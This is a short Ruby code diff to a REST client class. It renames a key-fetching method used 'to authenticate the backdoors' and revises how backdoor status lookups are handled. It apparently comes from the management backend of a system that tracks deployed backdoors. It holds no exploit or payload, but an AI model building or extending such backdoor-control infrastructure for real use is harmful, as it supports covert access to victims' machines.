@@ -195,16 +195,16 @@ class DB_rest
   end
 
   # used to authenticate the backdoors
-  def class_keys(build = '')
+  def factory_keys(build = '')
     begin
       if build != '' then
-        ret = rest_call('GET', "/backdoor/class_keys/#{build}")
+        ret = rest_call('GET', "/backdoor/factory_keys/#{build}")
       else
-        ret = rest_call('GET', '/backdoor/class_keys')
+        ret = rest_call('GET', '/backdoor/factory_keys')
       end
       return JSON.parse(ret.body)
     rescue Exception => e
-      trace :error, "Error calling class_keys: #{e.class} #{e.message}"
+      trace :error, "Error calling factory_keys: #{e.class} #{e.message}"
       propagate_error e
     end
   end
@@ -215,14 +215,14 @@ class DB_rest
       request = {:build_id => build_id, :instance_id => instance_id, :subtype => subtype}
       ret = rest_call('GET', '/backdoor/status/' + request.to_json)
 
+      return DB::NO_SUCH_BACKDOOR, 0 if ret.kind_of? Net::HTTPNotFound
+
       status = JSON.parse(ret.body)
 
-      return DB::NO_SUCH_BACKDOOR, 0 if status.empty?
+      bid = status['_id']
 
-      bid = status['backdoor_id']
-      if status['deleted'] == 1 then
-        return DB::DELETED_BACKDOOR, bid
-      end
+      return DB::DELETED_BACKDOOR, bid if status['deleted'] == true
+
       case status['status']
         when 'OPEN'
           return DB::ACTIVE_BACKDOOR, bid
